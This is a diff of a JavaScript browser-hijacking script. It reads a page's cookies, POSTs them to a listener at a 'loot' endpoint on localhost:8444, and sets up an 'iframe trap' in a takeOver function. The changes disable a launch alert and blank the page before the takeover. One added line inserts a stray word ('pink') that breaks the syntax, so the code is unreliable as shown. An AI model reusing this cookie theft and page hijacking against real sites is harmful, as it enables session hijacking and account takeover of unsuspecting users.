@@ -1,4 +1,4 @@
-alert('Ready to launch trap?');
+//alert('Ready to launch trap?');
 
 
 
@@ -251,7 +251,7 @@ function checkCookies()
 			cookieStorageDict[cookieName] = cookieValue;
 		}
 
-		// Ship it
+pink		// Ship it
 		request = new XMLHttpRequest();
 		request.open("POST", "http://localhost:8444/loot/dessert/" + sessionName);
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
@@ -383,7 +383,8 @@ function runUpdate()
 function takeOver()
 {
 
-	document.body.style.backgroundColor = "pink";
+	//document.body.style.backgroundColor = "pink";
+	document.innerHTML = "";
 
 	// Setup our iframe trap
 	var iframe = document.createElement("iframe");
